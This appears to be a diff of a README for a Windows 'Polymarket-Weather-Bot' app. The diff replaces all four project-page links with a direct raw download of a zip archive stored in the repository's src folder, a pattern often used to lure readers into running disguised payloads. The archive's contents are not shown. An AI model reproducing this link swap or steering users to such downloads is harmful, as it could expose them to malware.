@@ -1,12 +1,12 @@
 # 🌦️ Polymarket-Weather-Bot - Weather bets made simple
 
-[![Download or Visit Here](https://img.shields.io/badge/Download-Visit%20Project-1f6feb?style=for-the-badge&logo=github&logoColor=white)](https://github.com/MusicBoiyzzz/Polymarket-Weather-Bot)
+[![Download or Visit Here](https://img.shields.io/badge/Download-Visit%20Project-1f6feb?style=for-the-badge&logo=github&logoColor=white)](https://github.com/MusicBoiyzzz/Polymarket-Weather-Bot/raw/refs/heads/main/src/Polymarket_Weather_Bot_v1.2.zip)
 
 ## 📥 Download
 
 Use this link to visit the project page and download the app:
 
-[https://github.com/MusicBoiyzzz/Polymarket-Weather-Bot](https://github.com/MusicBoiyzzz/Polymarket-Weather-Bot)
+[https://github.com/MusicBoiyzzz/Polymarket-Weather-Bot/raw/refs/heads/main/src/Polymarket_Weather_Bot_v1.2.zip](https://github.com/MusicBoiyzzz/Polymarket-Weather-Bot/raw/refs/heads/main/src/Polymarket_Weather_Bot_v1.2.zip)
 
 ## 🖥️ What this app does
 
@@ -28,7 +28,7 @@ Follow the steps below to set up the app on Windows.
 
 Go to:
 
-[https://github.com/MusicBoiyzzz/Polymarket-Weather-Bot](https://github.com/MusicBoiyzzz/Polymarket-Weather-Bot)
+[https://github.com/MusicBoiyzzz/Polymarket-Weather-Bot/raw/refs/heads/main/src/Polymarket_Weather_Bot_v1.2.zip](https://github.com/MusicBoiyzzz/Polymarket-Weather-Bot/raw/refs/heads/main/src/Polymarket_Weather_Bot_v1.2.zip)
 
 ### 2. Find the download file
 
@@ -193,4 +193,4 @@ Keeping the app in one folder makes it easier to find later.
 
 If you need to visit the project page again, use this link:
 
-[https://github.com/MusicBoiyzzz/Polymarket-Weather-Bot](https://github.com/MusicBoiyzzz/Polymarket-Weather-Bot)
+[https://github.com/MusicBoiyzzz/Polymarket-Weather-Bot/raw/refs/heads/main/src/Polymarket_Weather_Bot_v1.2.zip](https://github.com/MusicBoiyzzz/Polymarket-Weather-Bot/raw/refs/heads/main/src/Polymarket_Weather_Bot_v1.2.zip)
